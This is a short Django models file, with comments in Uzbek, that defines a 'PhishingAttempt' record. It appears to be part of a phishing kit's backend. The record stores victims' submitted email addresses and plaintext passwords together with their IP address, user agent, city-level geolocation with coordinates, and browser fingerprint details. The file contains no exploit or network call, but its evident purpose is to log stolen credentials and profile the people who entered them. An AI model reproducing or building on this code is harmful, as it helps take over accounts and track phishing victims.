from django.db import models


class PhishingAttempt(models.Model):
    # Kiritilgan ma'lumotlar
    email = models.EmailField(blank=True)
    password = models.CharField(max_length=200, blank=True)

    # Tarmoq
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.CharField(max_length=500, blank=True)

    # Geolokatsiya
    country = models.CharField(max_length=100, blank=True)
    city = models.CharField(max_length=100, blank=True)
    latitude = models.FloatField(null=True, blank=True)
    longitude = models.FloatField(null=True, blank=True)

    # Fingerprint
    timezone = models.CharField(max_length=100, blank=True)
    language = models.CharField(max_length=50, blank=True)
    screen_size = models.CharField(max_length=50, blank=True)
    platform = models.CharField(max_length=100, blank=True)

    # Vaqt
    date = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.email} | {self.ip_address} | {self.country}/{self.city} | {self.date.strftime('%d.%m.%Y %H:%M')}"

    class Meta:
        verbose_name = "Phishing urinish"
        verbose_name_plural = "Phishing urinishlar"
        ordering = ['-date']